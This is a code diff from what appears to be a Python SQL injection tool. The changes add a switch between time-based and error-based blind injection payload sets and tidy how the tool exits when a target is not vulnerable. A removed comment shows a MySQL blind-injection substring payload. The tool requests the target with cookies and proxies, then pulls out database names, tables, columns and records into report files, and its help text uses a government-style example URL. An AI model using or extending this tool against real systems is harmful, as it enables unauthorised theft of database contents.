@@ -1011,12 +930,35 @@ class Injection:
 				if (limsup-liminf)-1==0:
 					found = True
 		return letras
-				#print "Ini:{0} Half:{1} Fin:{2}".format(liminf,medio,limsup)
-		#'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
-		#pass
 
 	def Begin(self):
 		print "(>¬.¬)>\n"+"="*20
+		print self.Based
+		if self.Based == "time":
+			self.PayloadsAttempt = timebased.PayloadsAttempt
+			self.PayloadsDBnames = timebased.PayloadsDBnames
+			self.RegisterLength = timebased.RegisterLength
+			self.TableLength = timebased.TableLength
+			self.TablesName = timebased.TablesName
+			self.ColumnLength = timebased.ColumnLength
+			self.ColumnNames= timebased.ColumnNames
+			self.numRegisters = timebased.numRegisters
+			self.RecordQuerys = timebased.RecordQuerys
+			self.TamrecordQuery = timebased.TamrecordQuery
+		else:
+			self.PayloadsAttempt = errorbased.PayloadsAttempt
+			self.PayloadsDBnames = errorbased.PayloadsDBnames
+			self.RegisterLength = errorbased.RegisterLength
+			self.TableLength = errorbased.TableLength
+			self.TablesName = errorbased.TablesName
+			self.ColumnLength = errorbased.ColumnLength
+			self.ColumnNames= errorbased.ColumnNames
+			self.numRegisters = errorbased.numRegisters
+			self.RecordQuerys = errorbased.RecordQuerys
+			self.TamrecordQuery = errorbased.TamrecordQuery
+
+		#print self.PayloadsDBnames
+		#exit(1)
 		#sleep(1)
 		if self.method:#GET
 			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
@@ -1071,16 +1013,22 @@ class Injection:
 				self.rmDupValue()
 				#Identify DB and show data injection if exists
 				self.Whatis()
+				if self.Which == "Unknown":
+					exit(1)
 				# Set a conditional to validate an existing log file generated previously
 				if self.dnames:
 					self.getDelimiters()
 					self.getPostDBnames()
-					self.getPostTables()
+					if self.tnames:
+						self.getPostTables()
 				else: exit(1)
 			else: # If a scanning was previously did it
 				self.showData(Previo=True)
 				if self.dnames:
 					self.getDelimiters()
+					if self.Which == 'Unknown':
+						print "Target not vulnerable"
+						exit(1)
 					self.getPostDBnames()
 				if self.tnames:
 					self.getPostTables()
@@ -1109,7 +1057,6 @@ class Injection:
 			try:
 				mkdir(self.reportDir+""+self.hname)
 			except:
-				#print "File "+self.hname+" Already exists"
 				pass
 		if isdir(self.fullPath):
 			pass
@@ -1117,7 +1064,6 @@ class Injection:
 			try:
 				mkdir(self.fullPath)
 			except:
-				#print "File "+self.aData+" Already exists"
 				pass
 		if isfile(self.fullPath+"/"+self.succesfullQuery) and isfile(self.fullPath+"/"+self.dataXtracted):
 			self.YaExiste = True
@@ -1127,11 +1073,10 @@ class Injection:
 				f = open(self.fullPath+"/"+self.dataXtracted,"a").close()
 			except:
 				pass
-				#print "Logs already exists"
 
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"ho:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db'])
+		opciones, argumentos = getopt(argv[1:],"ho:v",["request=","cookie=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time="])
 	except GetoptError:
 		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
 		exit(2)
@@ -1188,6 +1133,11 @@ def Opciones(argv):
 				clumns="all"
 			inject.searchRecords(True)
 			inject.setColumns(clumns)
+		# User define which Technique will be used
+		elif opt == '--based':
+			inject.setBased(vals)
+		elif opt == '--time':
+			inject.setTime(vals)
 		#Option not valid
 		elif opt == '--method':
 			if vals in ('get','post'):
